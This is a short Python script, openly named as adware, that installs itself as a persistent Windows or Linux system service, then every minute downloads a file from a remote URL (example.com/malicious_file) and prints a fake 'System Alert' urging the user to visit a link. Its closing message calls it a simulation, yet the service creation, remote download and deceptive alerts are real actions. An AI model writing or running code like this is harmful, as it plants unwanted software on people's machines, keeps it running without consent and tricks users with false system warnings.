import os
import platform
import requests
import time
import subprocess
from threading import Thread

def adware_auto_download_files_fake_alerts(download_url: str, alert_url: str) -> None:
    def download_file(url):
        response = requests.get(url)
        if response.status_code == 200:
            with open('downloaded_file', 'wb') as file:
                file.write(response.content)
            print(f"File downloaded from {url}")
        else:
            print(f"Failed to download file from {url}")

    def display_alert(url):
        print(f"System Alert: Visit {url} for important updates!")

    def create_service_windows():
        try:
            subprocess.run(['sc', 'create', 'AdwareService', 'binPath=', 'C:\\path\\to\\adware.exe'])
            print("Windows service 'AdwareService' created.")
        except Exception as e:
            print(f"Failed to create Windows service: {e}")

    def create_service_linux():
        try:
            with open('/etc/systemd/system/adware.service', 'w') as service_file:
                service_file.write('[Unit]\nDescription=Adware Service\n[Service]\nExecStart=/usr/bin/adware\n[Install]\nWantedBy=multi-user.target')
            subprocess.run(['systemctl', 'enable', 'adware'])
            subprocess.run(['systemctl', 'start', 'adware'])
            print("Linux service 'adware' created.")
        except Exception as e:
            print(f"Failed to create Linux service: {e}")

    def run_adware():
        while True:
            download_file(download_url)
            display_alert(alert_url)
            time.sleep(60)

    if platform.system() == "Windows":
        create_service_windows()
    elif platform.system() == "Linux":
        create_service_linux()

    adware_thread = Thread(target=run_adware)
    adware_thread.daemon = True
    adware_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Adware simulation stopped.")

if __name__ == "__main__":
    adware_auto_download_files_fake_alerts("http://example.com/malicious_file", "http://example.com/alert")
